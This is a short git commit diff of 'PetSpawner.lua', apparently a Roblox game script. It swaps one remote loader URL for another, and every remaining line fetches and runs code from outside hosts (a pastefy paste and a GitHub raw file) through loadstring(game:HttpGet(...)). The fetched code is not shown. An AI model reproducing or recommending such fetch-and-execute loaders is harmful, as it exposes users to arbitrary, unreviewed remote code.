62cf540e80dae2a527951c9194a4487fd6bcf2fa
ren <ikazuryzel@gmail.com>
2025-08-09 08:25:30 +0800

    Update PetSpawner.lua

--- PetSpawner.lua
+++ PetSpawner.lua
@@ -1,4 +1,3 @@
-ID="2eaab011-87c0-40e3-a83c-705a72f78877";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+loadstring(game:HttpGet("https://pastefy.app/1gXaVhk1/raw"))()
 task.wait(1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
